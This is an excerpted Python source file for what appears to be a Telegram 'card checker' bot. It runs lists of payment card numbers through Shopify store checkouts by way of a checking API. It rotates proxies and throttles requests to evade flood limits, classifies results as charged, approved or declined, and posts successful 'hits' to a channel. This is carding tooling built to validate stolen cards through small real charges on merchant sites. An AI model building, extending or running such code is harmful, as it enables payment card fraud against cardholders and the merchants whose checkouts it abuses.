...
SITE_PER_USER_WORKERS = 40
PROXY_PER_USER_WORKERS = 60
BIN_WORKERS = 25
API_TIMEOUT = 120
BIN_TIMEOUT = 60
PROXY_TIMEOUT = 8
...
class AdaptiveThrottler:
    def __init__(self, min_delay=0.02, max_delay=0.3):
    ...
    async def wait(self):
        ...
        if time.time() - self.last_adjust > 8:
    ...
    def report_flood(self, wait_seconds):
        ...
        self.recovery_until = time.time() + wait_seconds + 3
    ...
    def is_recovering(self):
        ...
        if self.flood_detected:
            self.flood_detected = False
        return False
GLOBAL_THROTTLER = AdaptiveThrottler(min_delay=0.02, max_delay=0.3)
class SessionPool:
    ...
    async def get_session(self):
        async with self._lock:
            ...
            return session
SESSION_POOL = SessionPool(pool_size=40)
class CircuitBreaker:
    def __init__(self, failure_threshold=25, recovery_time=10):
    ...
    async def call(self, func, *args, **kwargs):
        ...
        try:
            ...
            if self.failures >= self.failure_threshold:
                self.state = "OPEN"
            raise e
API_CIRCUIT = CircuitBreaker(failure_threshold=25, recovery_time=10)
class ResultCache:
...
def normalize_site_url(url):
    ...
    if '/' in url:
        url = url.split('/')[0]
    return url
def is_card_expired(card):
    try:
        parts = card.split('|')
        if len(parts) >= 3:
            mm = int(parts[1].strip())
            yy = int(parts[2].strip())
            now = datetime.now()
        ...
        return False
def is_response_accepted(response_text):
    if not response_text:
        return False
    rl = response_text.lower().strip()
...
async def detect_payment_gateway(site, proxy_data=None, http_session=None):
    ...
    try:
        ...
        async with s.get(url, timeout=30) as resp:
            ...
            if not is_response_accepted(rm):
                return 'dead'
            if 'shopify' in gw:
                return 'shopify'
            if is_site_error(rm):
...
def classify_response(rj):
    ...
    if price is not None and price != '-':
        price = f"${price}"
    rl = ar.lower()
    if not is_response_accepted(rl):
        return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Rejected"}
    if is_site_error(ar):
        return {"Response": ar, "Price": price, "Gateway": gw, "Status": "SiteError"}
    ch = ['order_paid', 'order_placed', 'charged', 'payment successful']
    ap = ['otp_required', '3d_authentication', '3ds_authentication', 'insufficient_funds', 'cvc', '3ds_required']
...
async def _check_card_api_internal(card, site, proxy_data=None, http_session=None):
    ...
    if is_card_expired(card):
        return {"Response": "Card Expired", "Price": "-", "Gateway": "-", "Status": "Rejected", "card": card, "site": site, "expired": True}
    ...
    try:
        async with s.get(url) as r:
            if r.status != 200:
                return {"Response": f"HTTP_{r.status}", "Price": "-", "Gateway": "-", "Status": "Rejected", "card": card, "site": site}
            try:
                rj = await r.json(content_type=None)
            except:
                return {"Response": "Invalid JSON", "Price": "-", "Gateway": "-", "Status": "Rejected", "card": card, "site": site}
    except asyncio.TimeoutError:
        return {"Response": "Timeout", "Price": "-", "Gateway": "-", "Status": "Rejected", "card": card, "site": site}
    except Exception as e:
        return {"Response": str(e)[:100], "Price": "-", "Gateway": "-", "Status": "Rejected", "card": card, "site": site}
...
async def check_card_with_retry(card, sites, user_id=None, proxies_data=None, max_retries=3, rotator=None, cancel_check=None, http_session=None):
    if not sites:
        return {"Response": "No sites", "Price": "-", "Gateway": "-", "Status": "Rejected", "card": card}
    if is_card_expired(card):
        return {"Response": "Card Expired", "Price": "-", "Gateway": "-", "Status": "Rejected", "card": card, "expired": True}
    tried_sites = set()
    tried_proxies = set()
    last = None
    for attempt in range(max_retries):
        if cancel_check and cancel_check():
            return {"Response": "Stopped", "Price": "-", "Gateway": "-", "Status": "Rejected", "card": card}
        if rotator:
        ...
        try:
            ...
            if attempt < max_retries - 1:
                ...
                return {"Response": str(e)[:100], "Price": "-", "Gateway": "Unknown", "Status": "Rejected", "card": card, "site": site}
    ...
    if last:
        ...
        return last
    return {"Response": "Max retries", "Price": "-", "Gateway": "-", "Status": "Rejected", "card": card}
...
def format_simple_card_result(status, card, gateway, response, bin_info=None, elapsed=0.0, extra_field=None):
    sm = {
        ...
        "Rejected": (f"🚫 <b>{bs('REJECTED')}</b> 🚫", [CE["cross"]]),
...
async def send_channel_hit(res, uid, username, name):
    try:
        ...
        if sv in ["CHARGED", "APPROVED"]:
            ...
            if sv == "CHARGED":
                emoji_start = gemj('heart_fire')
                emoji_end = gemj('heart_fire')
                emoji_id = CE["heart_fire"]
            else:
                emoji_start = gemj('check')
                emoji_end = gemj('check')
                emoji_id = CE["check"]
            msg = f"""{emoji_start} <b>{bs(sv)}</b> {emoji_end}
<b>━━━━━━━━━━━━━━━━━</b>
💳 <b>{bs('Card')}</b>
...
𝗗𝗲𝘃 → sonik"""
            ...
            await styled_send(HIT_CHANNEL_ID, msg, buttons=HIT_BUTTON, emoji_ids=[emoji_id])
    except:
        pass
...
💡 <i>{bs('Then try /sp again')}</i>""", emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["link"], CE["info"]])
    ...
    if is_card_expired(card):
        return await styled_reply(event, f"🚫 <b>{bs('REJECTED')}</b> 🚫\n<b>━━━━━━━━━━━━━━━━━</b>\n💳 <b>{bs('Card')}</b>\n⤷ <code>{card}</code>\n📝 <b>{bs('Response')}</b> ━ <code>Card Expired</code>\n<b>━━━━━━━━━━━━━━━━━</b>\n💡 <i>{bs('Card is expired')}</i>", emoji_ids=[CE["cross"]])
    ...
    try:
        ...
        if status == "Rejected":
            try:
                ...
                pass
            return await styled_reply(event, f"🚫 <b>{bs('REJECTED')}</b> 🚫\n<b>━━━━━━━━━━━━━━━━━</b>\n💳 <b>{bs('Card')}</b>\n⤷ <code>{card}</code>\n📝 <b>{bs('Response')}</b> ━ <code>{result.get('Response', 'Not Accepted')}</code>\n<b>━━━━━━━━━━━━━━━━━</b>\n💡 <i>{bs('Response not accepted or card expired')}</i>", emoji_ids=[CE["cross"]])
...
💡 <i>{bs('Then try /msp again')}</i>""", emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["link"], CE["info"]])
    ...
    if expired_cards:
        await styled_reply(event, f"⚠️ <b>{bs('Removed')} {len(expired_cards)} {bs('expired cards')}</b>", emoji_ids=[CE["warn"]])
    if not valid_cards:
        return await styled_reply(event, f"🚫 <b>{bs('All cards are expired')}</b>", emoji_ids=[CE["cross"]])
    cards = valid_cards
    kb = [
...
🚫 <b>{bs('Expired Removed')}:</b> <code>{len(expired_cards)}</code>
...
async def _run_mass_process(event, cards, proxies, send_approved, process_store, stop_prefix, check_func, gate_name, sem_type, filter_type="both"):
    ...
    try:
        ...
        username, name = f"user_{uid}", "User"
    total = len(cards)
    checked = charged = approved = declined = errors = rejected = 0
    st = time.time()
    hits = []
    ...
    async def update_ui():
        ...
        kb = [
            ...
            [pbtn(f"🚫 {bs('REJECTED')} ━ {rejected}", "none", style="danger")],
    ...
    async def worker(card):
        nonlocal checked, charged, approved, declined, errors, rejected, lcd, lrd
        if is_stopped():
            return
        if await check_banned_async():
            return
...
🚫 <b>{bs('Rejected')}</b> ━ <code>{rejected}</code>
❌ <b>{bs('Declined')}</b> ━ <code>{declined}</code>
⚠️ <b>{bs('Errors')}</b> ━ <code>{errors}</code>
<b>━━━━━━━━━━━━━━━━━</b>
📋 <b>{bs('Checked')}</b> ━ <code>{checked}/{total}</code>"""
    fkb = [
        [pbtn(f"🔥 {bs('C')} ━ {charged}", "none"), pbtn(f"✅ {bs('A')} ━ {approved}", "none"), pbtn(f"🚫 {bs('R')} ━ {rejected}", "none")],
...
async def main():
    ...
    while True:
        try:
            ...
            log_system("BOOT", "✅ Only ACCEPTED_RESPONSES: 3ds_required, insufficient_funds, card_declined, order_paid, charged, payment successful")
            log_system("BOOT", "✅ ANY other response = REJECTED")
            log_system("BOOT", "✅ Price filtering from 0.01 USD")
            log_system("BOOT", "✅ 3ds_required, 3DS_AUTHENTICATION classified as Approved")
            ...
            log_system("BOOT", "✅ Expired cards filtered automatically")
            log_system("BOOT", "✅ Premium emojis in channel hits")
